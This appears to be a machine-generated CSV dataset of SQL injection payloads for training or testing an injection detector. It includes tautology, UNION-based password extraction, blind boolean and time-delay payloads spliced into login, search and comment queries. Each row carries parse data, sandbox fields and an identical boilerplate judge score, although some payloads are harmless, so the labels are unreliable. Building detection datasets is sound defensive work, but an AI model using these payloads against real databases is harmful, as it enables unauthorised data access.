query_id,payload,full_query,llm_attack_category,template_context,label,mutation_count,codebert_score,ast_is_valid,ast_dialect,ast_node_set,sandbox_executed,sandbox_detection_mode,sandbox_exploit_type,judge_malicious_intent_preserved,judge_realistic_for_context,judge_non_trivial_mutation,judge_overall_quality_score,judge_reason
q00836,%23 AND (SELECT COUNT(*) FROM users AS u JOIN roles AS r ON u.role_id = r.id WHERE r.name = 'admin') --,SELECT * FROM users WHERE id = %23 AND (SELECT COUNT(*) FROM users AS u JOIN roles AS r ON u.role_id = r.id WHERE r.name = 'admin') --,encoding_obfuscation,user_lookup,1,0,0.0,True,default,"[""Join"", ""From"", ""And"", ""Mod"", ""TableAlias"", ""Subquery"", ""Identifier"", ""EQ"", ""Table"", ""Star"", ""Column"", ""Select"", ""Where"", ""Count"", ""Literal""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00837,' OR (SELECT SLEEP(5))--,SELECT * FROM users WHERE id = ' OR (SELECT SLEEP(5))--,encoding_obfuscation,user_lookup,1,0,0.0,True,default,"[""From"", ""Or"", ""Subquery"", ""Identifier"", ""EQ"", ""Table"", ""Anonymous"", ""Star"", ""Column"", ""Select"", ""Where"", ""Literal""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00838,"' OR ASCII(SUBSTRING((SELECT password FROM users WHERE id = 1), 1, 1)) > 50--","SELECT * FROM users WHERE id = ' OR ASCII(SUBSTRING((SELECT password FROM users WHERE id = 1), 1, 1)) > 50--",encoding_obfuscation,user_lookup,1,0,0.0,True,default,"[""Ascii"", ""From"", ""GT"", ""Substring"", ""Or"", ""Subquery"", ""Identifier"", ""EQ"", ""Table"", ""Star"", ""Column"", ""Select"", ""Where"", ""Literal""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00839,%27%20LIKE%20'%25--,SELECT * FROM orders WHERE status = '%27%20LIKE%20'%25--' ORDER BY date DESC,encoding_obfuscation,order_filter,1,0,0.0,True,default,"[""From"", ""Mod"", ""Identifier"", ""EQ"", ""Table"", ""Star"", ""Column"", ""Select"", ""Where"", ""Literal""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00843,'/*AND%20*/%20OR%201=1%20;--,"INSERT INTO comments (user_id, body) VALUES (1, ''/*AND%20*/%20OR%201=1%20;--')",encoding_obfuscation,comment_insert,1,0,0.0,True,mysql,"[""From"", ""Semicolon"", ""Mod"", ""Identifier"", ""EQ"", ""Table"", ""Star"", ""Column"", ""Select"", ""Where"", ""Literal""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00846,"--' UNION ALL SELECT NULL,NULL --","INSERT INTO comments (user_id, body) VALUES (1, '--' UNION ALL SELECT NULL,NULL --')",encoding_obfuscation,comment_insert,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00847,--' AND (SELECT 1 FROM (SELECT COUNT(*) AS num FROM users WHERE username LIKE '%admin'))--,"INSERT INTO comments (user_id, body) VALUES (1, '--' AND (SELECT 1 FROM (SELECT COUNT(*) AS num FROM users WHERE username LIKE '%admin'))--')",encoding_obfuscation,comment_insert,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00848,--' AND WAITFOR DELAY '0:0:5' --,"INSERT INTO comments (user_id, body) VALUES (1, '--' AND WAITFOR DELAY '0:0:5' --')",encoding_obfuscation,comment_insert,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00849,' OR (CASE WHEN 1=1 THEN CAST(1 AS VARCHAR) ELSE CAST(0 AS VARCHAR) END)='1',"INSERT INTO comments (user_id, body) VALUES (1, '' OR (CASE WHEN 1=1 THEN CAST(1 AS VARCHAR) ELSE CAST(0 AS VARCHAR) END)='1'')",encoding_obfuscation,comment_insert,1,0,0.0,True,default,"[""From"", ""If"", ""Cast"", ""Paren"", ""Or"", ""Identifier"", ""EQ"", ""Table"", ""Star"", ""Column"", ""Case"", ""Select"", ""Where"", ""DataType"", ""Literal""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00850,' OR EXISTS (SELECT 1 FROM sessions WHERE session_token IS NULL),"INSERT INTO comments (user_id, body) VALUES (1, '' OR EXISTS (SELECT 1 FROM sessions WHERE session_token IS NULL)')",encoding_obfuscation,comment_insert,1,0,0.0,True,default,"[""Exists"", ""From"", ""Is"", ""Or"", ""Identifier"", ""EQ"", ""Table"", ""Star"", ""Column"", ""Select"", ""Where"", ""Literal"", ""Null""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00851,(SELECT COUNT(*) FROM information_schema.tables WHERE table_name LIKE '%users%')--,SELECT * FROM users WHERE username = '(SELECT COUNT(*) FROM information_schema.tables WHERE table_name LIKE '%users%')--' AND password = 'anything',nested_injection,login,1,0,0.0,True,default,"[""From"", ""Subquery"", ""Identifier"", ""Like"", ""Table"", ""Star"", ""Column"", ""Select"", ""Where"", ""Count"", ""Literal""]",True,complete_query,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00852,(CASE WHEN EXISTS(SELECT 1 FROM users WHERE username='admin') THEN 1 ELSE 0 END) --,SELECT * FROM users WHERE username = '(CASE WHEN EXISTS(SELECT 1 FROM users WHERE username='admin') THEN 1 ELSE 0 END) --' AND password = 'anything',nested_injection,login,1,0,0.0,True,default,"[""Exists"", ""From"", ""If"", ""Paren"", ""Identifier"", ""EQ"", ""Table"", ""Column"", ""Case"", ""Select"", ""Where"", ""Literal""]",True,complete_query,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00853,"--' UNION ALL SELECT NULL, NULL, NULL, CAST((SELECT USER FROM DUAL) AS VARCHAR2(100)) --","SELECT * FROM users WHERE username = '--' UNION ALL SELECT NULL, NULL, NULL, CAST((SELECT USER FROM DUAL) AS VARCHAR2(100)) --' AND password = 'anything'",nested_injection,login,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00854,(SELECT 'a' FROM users WHERE username=(SELECT 'b' UNION SELECT 'c'))--,SELECT * FROM users WHERE username = '(SELECT 'a' FROM users WHERE username=(SELECT 'b' UNION SELECT 'c'))--' AND password = 'anything',nested_injection,login,1,0,0.0,True,default,"[""From"", ""Subquery"", ""Identifier"", ""EQ"", ""Table"", ""Union"", ""Column"", ""Select"", ""Where"", ""Literal""]",True,complete_query,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00855,' OR '1'='1' AND 1=(SELECT 1 FROM (SELECT 1 FROM users WHERE 'x'='y'))--,SELECT * FROM users WHERE username = '' OR '1'='1' AND 1=(SELECT 1 FROM (SELECT 1 FROM users WHERE 'x'='y'))--' AND password = 'anything',nested_injection,login,1,0,0.0,True,default,"[""From"", ""And"", ""Or"", ""Subquery"", ""Identifier"", ""EQ"", ""Table"", ""Star"", ""Column"", ""Select"", ""Where"", ""Literal""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00857,"--' AND 1=1 UNION ALL SELECT (SELECT COUNT(*) FROM users WHERE 1=1),NULL,NULL","SELECT * FROM users WHERE username = '--' AND 1=1 UNION ALL SELECT (SELECT COUNT(*) FROM users WHERE 1=1),NULL,NULL' AND password = 'anything'",nested_injection,login,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00858,(SELECT * FROM (SELECT 1 FROM users WHERE ROWNUM=1) WHERE 1=1 AND (SELECT 1 FROM users WHERE 'x'='x'))--,SELECT * FROM users WHERE username = '(SELECT * FROM (SELECT 1 FROM users WHERE ROWNUM=1) WHERE 1=1 AND (SELECT 1 FROM users WHERE 'x'='x'))--' AND password = 'anything',nested_injection,login,1,0,0.0,True,default,"[""From"", ""And"", ""Subquery"", ""Identifier"", ""EQ"", ""Table"", ""Star"", ""Column"", ""Select"", ""Where"", ""Literal""]",True,complete_query,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00859,' OR 1=1 AND (SELECT UPPER(TO_CHAR(SYSDATE)) FROM dual)=UPPER(TO_CHAR(SYSDATE)),SELECT * FROM users WHERE username = '' OR 1=1 AND (SELECT UPPER(TO_CHAR(SYSDATE)) FROM dual)=UPPER(TO_CHAR(SYSDATE))' AND password = 'anything',nested_injection,login,1,0,0.0,True,default,"[""From"", ""And"", ""Upper"", ""Or"", ""Subquery"", ""Identifier"", ""EQ"", ""Table"", ""ToChar"", ""Star"", ""Column"", ""Select"", ""Where"", ""Literal""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00860,(SELECT * FROM users WHERE username='admin' AND password IS NULL GROUP BY password HAVING COUNT(*))--,SELECT * FROM users WHERE username = '(SELECT * FROM users WHERE username='admin' AND password IS NULL GROUP BY password HAVING COUNT(*))--' AND password = 'anything',nested_injection,login,1,0,0.0,True,default,"[""From"", ""Having"", ""And"", ""Is"", ""Subquery"", ""Identifier"", ""EQ"", ""Table"", ""Star"", ""Column"", ""Select"", ""Where"", ""Count"", ""Group"", ""Literal"", ""Null""]",True,complete_query,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00861,"--' AND 1=1 UNION ALL SELECT 1,(SELECT SYSDBA FROM dual),(SELECT SYSOPER FROM dual),(SELECT DBA FROM dual)","SELECT * FROM users WHERE username = '--' AND 1=1 UNION ALL SELECT 1,(SELECT SYSDBA FROM dual),(SELECT SYSOPER FROM dual),(SELECT DBA FROM dual)' AND password = 'anything'",nested_injection,login,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00862,--%'; WAITFOR DELAY '0:0:5'); --,SELECT * FROM products WHERE name LIKE '%--%'; WAITFOR DELAY '0:0:5'); --%',nested_injection,search,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00863,OR 1=1 AND (SELECT COUNT(*) FROM users WHERE username='admin') = 1,SELECT * FROM products WHERE name LIKE '%OR 1=1 AND (SELECT COUNT(*) FROM users WHERE username='admin') = 1%',nested_injection,search,1,0,0.0,True,default,"[""From"", ""And"", ""Or"", ""Subquery"", ""Identifier"", ""EQ"", ""Table"", ""Star"", ""Column"", ""Select"", ""Where"", ""Count"", ""Literal""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00865,' OR 1=(SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END FROM users)--,SELECT * FROM products WHERE name LIKE '%' OR 1=(SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END FROM users)--%',nested_injection,search,1,0,0.0,True,default,"[""From"", ""If"", ""Or"", ""Subquery"", ""Identifier"", ""EQ"", ""Table"", ""Star"", ""Column"", ""Case"", ""Select"", ""Where"", ""Literal""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00866,--' AND 1 IN (SELECT 1 FROM products WHERE price < (SELECT MAX(price) FROM products))--,SELECT * FROM products WHERE name LIKE '%--' AND 1 IN (SELECT 1 FROM products WHERE price < (SELECT MAX(price) FROM products))--%',nested_injection,search,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00867,"' OR 1=IF((SELECT 1 FROM information_schema.tables WHERE table_name='users'),1,0)","SELECT * FROM products WHERE name LIKE '%' OR 1=IF((SELECT 1 FROM information_schema.tables WHERE table_name='users'),1,0)%'",nested_injection,search,1,0,0.0,True,default,"[""If"", ""From"", ""Or"", ""Subquery"", ""Identifier"", ""EQ"", ""Table"", ""Star"", ""Column"", ""Select"", ""Where"", ""Literal""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00869,"AND '1'='1' UNION ALL SELECT username,password FROM auth.users--","SELECT * FROM products WHERE name LIKE '%AND '1'='1' UNION ALL SELECT username,password FROM auth.users--%'",nested_injection,search,1,0,0.0,True,default,"[""From"", ""And"", ""Identifier"", ""EQ"", ""Table"", ""Union"", ""Star"", ""Column"", ""Select"", ""Where"", ""Literal""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00871,--' AND (SELECT 1 FROM (SELECT username FROM users WHERE username = 'admin')) > 0,SELECT * FROM products WHERE name LIKE '%--' AND (SELECT 1 FROM (SELECT username FROM users WHERE username = 'admin')) > 0%',nested_injection,search,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00875,1 OR EXISTS(SELECT * FROM (SELECT 1 FROM users WHERE username = 'admin')) --,SELECT * FROM users WHERE id = 1 OR EXISTS(SELECT * FROM (SELECT 1 FROM users WHERE username = 'admin')) --,nested_injection,user_lookup,1,0,0.0,True,default,"[""Exists"", ""From"", ""Or"", ""Subquery"", ""Identifier"", ""EQ"", ""Table"", ""Star"", ""Column"", ""Select"", ""Where"", ""Literal""]",True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00876,"--' UNION SELECT NULL, NULL, (SELECT 1 FROM users WHERE username='admin'), NULL --","SELECT * FROM users WHERE id = --' UNION SELECT NULL, NULL, (SELECT 1 FROM users WHERE username='admin'), NULL --",nested_injection,user_lookup,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00877,(SELECT CHAR(97)) OR '1'='1',SELECT * FROM users WHERE id = (SELECT CHAR(97)) OR '1'='1',nested_injection,user_lookup,1,0,0.0,True,default,"[""Or"", ""Subquery"", ""EQ"", ""Chr"", ""Select"", ""Literal""]",True,complete_query,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00878,1' AND (SELECT SUM(CASE WHEN 1=1 THEN 1 ELSE 0 END) FROM users)--,SELECT * FROM users WHERE id = 1' AND (SELECT SUM(CASE WHEN 1=1 THEN 1 ELSE 0 END) FROM users)--,nested_injection,user_lookup,1,0,0.0,True,default,"[""From"", ""If"", ""And"", ""Sum"", ""Subquery"", ""Identifier"", ""EQ"", ""Table"", ""Star"", ""Column"", ""Case"", ""Select"", ""Where"", ""Literal""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00879,1' OR 1 IN (SELECT 1 FROM users WHERE username = 'admin')--,SELECT * FROM users WHERE id = 1' OR 1 IN (SELECT 1 FROM users WHERE username = 'admin')--,nested_injection,user_lookup,1,0,0.0,True,default,"[""From"", ""Or"", ""Subquery"", ""Identifier"", ""EQ"", ""Table"", ""Star"", ""Column"", ""Select"", ""Where"", ""In"", ""Literal""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00880,"' UNION SELECT NULL, NULL, (SELECT 1 FROM users WHERE username LIKE '%admin%') --","SELECT * FROM users WHERE id = ' UNION SELECT NULL, NULL, (SELECT 1 FROM users WHERE username LIKE '%admin%') --",nested_injection,user_lookup,1,0,0.0,True,default,"[""From"", ""Subquery"", ""Identifier"", ""EQ"", ""Like"", ""Table"", ""Union"", ""Star"", ""Column"", ""Select"", ""Where"", ""Literal"", ""Null""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00883,(CASE WHEN (SELECT version() FROM information_schema.tables WHERE table_schema=database()) LIKE 'MySQL%' THEN (SELECT sleep(5)) END),SELECT * FROM orders WHERE status = '(CASE WHEN (SELECT version() FROM information_schema.tables WHERE table_schema=database()) LIKE 'MySQL%' THEN (SELECT sleep(5)) END)' ORDER BY date DESC,nested_injection,order_filter,1,0,0.0,True,mysql,"[""From"", ""If"", ""Paren"", ""Subquery"", ""Identifier"", ""EQ"", ""Like"", ""Table"", ""CurrentVersion"", ""Anonymous"", ""Column"", ""CurrentSchema"", ""Case"", ""Select"", ""Where"", ""Literal""]",True,complete_query,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00884,' OR EXISTS(SELECT * FROM products WHERE price=(SELECT MIN(price)+1 FROM orders WHERE status='pending')) AND '1'='1,SELECT * FROM orders WHERE status = '' OR EXISTS(SELECT * FROM products WHERE price=(SELECT MIN(price)+1 FROM orders WHERE status='pending')) AND '1'='1' ORDER BY date DESC,nested_injection,order_filter,1,0,0.0,True,default,"[""Exists"", ""From"", ""And"", ""Add"", ""Or"", ""Min"", ""Identifier"", ""EQ"", ""Subquery"", ""Table"", ""Star"", ""Column"", ""Select"", ""Where"", ""Literal""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00885,--' UNION ALL SELECT * FROM users --,SELECT * FROM orders WHERE status = '--' UNION ALL SELECT * FROM users --' ORDER BY date DESC,nested_injection,order_filter,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00888,"' OR (SELECT * FROM (SELECT DBMS_PIPE.RECEIVE_MESSAGE('BCEO', 5) FROM DUAL) AS t1 WHERE 1=1)","SELECT * FROM orders WHERE status = '' OR (SELECT * FROM (SELECT DBMS_PIPE.RECEIVE_MESSAGE('BCEO', 5) FROM DUAL) AS t1 WHERE 1=1)' ORDER BY date DESC",nested_injection,order_filter,1,0,0.0,True,default,"[""From"", ""TableAlias"", ""Or"", ""Subquery"", ""Identifier"", ""EQ"", ""Table"", ""Anonymous"", ""Star"", ""Column"", ""Dot"", ""Select"", ""Where"", ""Literal""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00890,' OR (SELECT * FROM (SELECT SLEEP(5) FROM (SELECT * FROM orders WHERE status = 'shipped') AS t1) WHERE 1=1),SELECT * FROM orders WHERE status = '' OR (SELECT * FROM (SELECT SLEEP(5) FROM (SELECT * FROM orders WHERE status = 'shipped') AS t1) WHERE 1=1)' ORDER BY date DESC,nested_injection,order_filter,1,0,0.0,True,default,"[""From"", ""TableAlias"", ""Or"", ""Subquery"", ""Identifier"", ""EQ"", ""Table"", ""Anonymous"", ""Star"", ""Column"", ""Select"", ""Where"", ""Literal""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00891,1' AND (SELECT COUNT(*) FROM users WHERE user_id = (SELECT MAX(user_id) FROM users)) --,"INSERT INTO comments (user_id, body) VALUES (1, '1' AND (SELECT COUNT(*) FROM users WHERE user_id = (SELECT MAX(user_id) FROM users)) --')",nested_injection,comment_insert,1,0,0.0,True,default,"[""Max"", ""From"", ""And"", ""Subquery"", ""Identifier"", ""EQ"", ""Table"", ""Star"", ""Column"", ""Select"", ""Where"", ""Count"", ""Literal""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00892,"1' UNION SELECT NULL, DBMS_ALERT.WAITONE(NULL, 5) --","INSERT INTO comments (user_id, body) VALUES (1, '1' UNION SELECT NULL, DBMS_ALERT.WAITONE(NULL, 5) --')",nested_injection,comment_insert,1,0,0.0,True,default,"[""From"", ""Identifier"", ""EQ"", ""Table"", ""Union"", ""Anonymous"", ""Star"", ""Column"", ""Dot"", ""Select"", ""Where"", ""Literal"", ""Null""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00893,"1' AND (SELECT ASCII(SUBSTRING(body, 1, 1)) FROM comments WHERE comment_id = 1) = 65 --","INSERT INTO comments (user_id, body) VALUES (1, '1' AND (SELECT ASCII(SUBSTRING(body, 1, 1)) FROM comments WHERE comment_id = 1) = 65 --')",nested_injection,comment_insert,1,0,0.0,True,default,"[""Ascii"", ""From"", ""Substring"", ""And"", ""Subquery"", ""Identifier"", ""EQ"", ""Table"", ""Star"", ""Column"", ""Select"", ""Where"", ""Literal""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00894,1' OR EXISTS(SELECT 1 FROM information_schema.tables WHERE table_name = 'users') --,"INSERT INTO comments (user_id, body) VALUES (1, '1' OR EXISTS(SELECT 1 FROM information_schema.tables WHERE table_name = 'users') --')",nested_injection,comment_insert,1,0,0.0,True,default,"[""Exists"", ""From"", ""Or"", ""Identifier"", ""EQ"", ""Table"", ""Star"", ""Column"", ""Select"", ""Where"", ""Literal""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00896,--'; SELECT 1+1 AS 'nested_result',"INSERT INTO comments (user_id, body) VALUES (1, '--'; SELECT 1+1 AS 'nested_result'')",nested_injection,comment_insert,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00897,/**/ ; SELECT 1 /**/ +/**/ 1 AS 'commented_nested_result',"INSERT INTO comments (user_id, body) VALUES (1, '/**/ ; SELECT 1 /**/ +/**/ 1 AS 'commented_nested_result'')",nested_injection,comment_insert,1,0,0.0,True,default,"[""Semicolon"", ""Alias"", ""Add"", ""Identifier"", ""Select"", ""Literal""]",True,complete_query,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00899,"1' OR ASCII(SUBSTRING((SELECT body FROM comments LIMIT 1), 1, 1)) = 65 --","INSERT INTO comments (user_id, body) VALUES (1, '1' OR ASCII(SUBSTRING((SELECT body FROM comments LIMIT 1), 1, 1)) = 65 --')",nested_injection,comment_insert,1,0,0.0,True,default,"[""Ascii"", ""From"", ""Substring"", ""Or"", ""Limit"", ""Identifier"", ""EQ"", ""Subquery"", ""Table"", ""Star"", ""Column"", ""Select"", ""Where"", ""Literal""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00900,--'; SELECT COUNT(*) FROM users WHERE user_id = 1,"INSERT INTO comments (user_id, body) VALUES (1, '--'; SELECT COUNT(*) FROM users WHERE user_id = 1')",nested_injection,comment_insert,1,0,0.0,True,default,[],True,complete_query,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00901,/*nested*/ ; SELECT 1 * 1 AS 'nested_result',"INSERT INTO comments (user_id, body) VALUES (1, '/*nested*/ ; SELECT 1 * 1 AS 'nested_result'')",nested_injection,comment_insert,1,0,0.0,True,default,"[""Semicolon"", ""Alias"", ""Identifier"", ""Select"", ""Mul"", ""Literal""]",True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00902,"1' AND (SELECT SUBSTRING((SELECT body FROM comments LIMIT 1), 1, 1) FROM (SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END))","INSERT INTO comments (user_id, body) VALUES (1, '1' AND (SELECT SUBSTRING((SELECT body FROM comments LIMIT 1), 1, 1) FROM (SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END))')",nested_injection,comment_insert,1,0,0.0,True,default,"[""From"", ""If"", ""Substring"", ""And"", ""Limit"", ""Identifier"", ""EQ"", ""Subquery"", ""Table"", ""Star"", ""Column"", ""Case"", ""Select"", ""Where"", ""Literal""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00903,OR '1'='1'; --,SELECT * FROM users WHERE username = 'OR '1'='1'; --' AND password = 'anything',tautology,login,1,1,0.0,True,default,"[""Identifier"", ""Where"", ""Table"", ""Or"", ""Select"", ""Semicolon"", ""Literal"", ""From"", ""Star"", ""EQ""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00905,OR '0'='0',SELECT * FROM users WHERE username = 'OR '0'='0'' AND password = 'anything',tautology,login,1,1,0.0,True,default,"[""Identifier"", ""Where"", ""Table"", ""Or"", ""Select"", ""Literal"", ""From"", ""Star"", ""EQ""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00906,' AND 1=1,SELECT * FROM users WHERE username = '' AND 1=1' AND password = 'anything',tautology,login,1,1,0.0,True,default,"[""Identifier"", ""Where"", ""Table"", ""Select"", ""Column"", ""Literal"", ""From"", ""Star"", ""EQ"", ""And""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00907,) OR 1=1; --,SELECT * FROM products WHERE name LIKE '%) OR 1=1; --%',tautology,search,1,1,0.0,True,default,"[""Identifier"", ""Where"", ""Table"", ""Select"", ""Column"", ""Literal"", ""From"", ""Star"", ""EQ""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00908,"' OR 1=1 LIMIT 0,1 --","SELECT * FROM products WHERE name LIKE '%' OR 1=1 LIMIT 0,1 --%'",tautology,search,1,1,0.0,True,default,"[""Identifier"", ""Where"", ""Limit"", ""Or"", ""Select"", ""Column"", ""Offset"", ""Table"", ""Literal"", ""From"", ""Star"", ""EQ""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00909,-- 1=1;,SELECT * FROM orders WHERE status = '-- 1=1;' ORDER BY date DESC,tautology,order_filter,1,1,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
